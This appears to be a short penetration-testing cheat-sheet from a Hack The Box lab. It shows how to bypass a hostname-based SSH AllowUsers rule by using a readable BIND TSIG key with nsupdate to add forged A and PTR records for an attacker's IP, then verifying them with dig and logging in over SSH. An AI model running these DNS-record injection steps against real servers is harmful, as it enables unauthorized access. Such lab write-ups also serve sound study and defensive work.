# nsupdate Dynamic DNS SSH Key Injection

When SSH is configured to allow access from a dynamically-resolved hostname (e.g., `AllowUsers *@*.infra.dyna.htb`), adding an A record and PTR record for an attacker's IP via `nsupdate` allows SSH access as that user.

## Check SSH sshd_config

```bash
cat /etc/ssh/sshd_config | grep -i allow
# AllowUsers bindmgr@*.infra.dyna.htb
```

## Use nsupdate with Key File

```bash
# nsupdate requires a TSIG key file for authenticated zone updates
# Key often in /etc/bind/*.key or accessible to DNS-admin user

nsupdate -k /etc/bind/infra.key << EOF
server 127.0.0.1
zone dyna.htb
update add <YOURNAME>.infra.dyna.htb 30 IN A <LHOST>
send
zone 10.in-addr.arpa
update add <REVERSED_IP>.in-addr.arpa 30 IN PTR <YOURNAME>.infra.dyna.htb
send
EOF
```

## Verify and SSH

```bash
# Verify DNS records
dig +short <YOURNAME>.infra.dyna.htb @<TARGET>
dig +short -x <LHOST> @<TARGET>

# SSH with the user's key (if found/known)
ssh -i <private_key> bindmgr@<TARGET>
```

## Notes
- `nsupdate` uses TSIG (HMAC-based) key files for authenticated updates
- Key files in Bind config directories: `/etc/bind/`, often readable by bind/dns group users
- Requires both A record (forward) and PTR record (reverse) for hostname match
- The SSH `AllowUsers` directive can use wildcards for hostname-based ACLs
- Also check: zone transfer keys, admin panel access for DNS services
